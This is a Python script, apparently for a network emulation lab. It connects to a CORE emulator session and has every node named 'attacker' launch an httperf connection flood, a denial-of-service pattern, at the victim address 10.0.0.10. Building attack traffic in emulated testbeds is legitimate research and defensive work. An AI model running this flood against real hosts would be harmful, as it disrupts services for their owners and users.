from core.api.grpc import client
from core.api.grpc.wrappers import SessionState

victim_ip = "10.0.0.10"
attacker_command = f"httperf --server {victim_ip} --hog --num-conn 999999999 --num-call 10 --timeout 0.01"
cosmic_command = "cd /home/core/Desktop/vmware_shared/cosmic && python3 cosmic_server.py"

def attacker_command_run():
    attacker_nodes = {}
    for node_id in range(1, session.nodes + 1):
        node = core.get_node(session.id, node_id)
        if node.node.name.startswith("attacker"):
            attacker_nodes[node_id] = node.node
            core.node_command(session.id, node.node.id, attacker_command, wait=False, shell=True)
            print(f"{node.node.name} started")
    return attacker_nodes

# create grpc client and connect
core = client.CoreGrpcClient()
core.connect()

# search session
sessions = core.get_sessions().sessions

if len(sessions) != 1:
    print("Error: only one session is supported")
    exit(1)
    
session = sessions[0]
print(session)

if session.state != SessionState.RUNTIME.value:
    print("Error: session is not in runtime state")
    exit(2)

attacker_command_run()
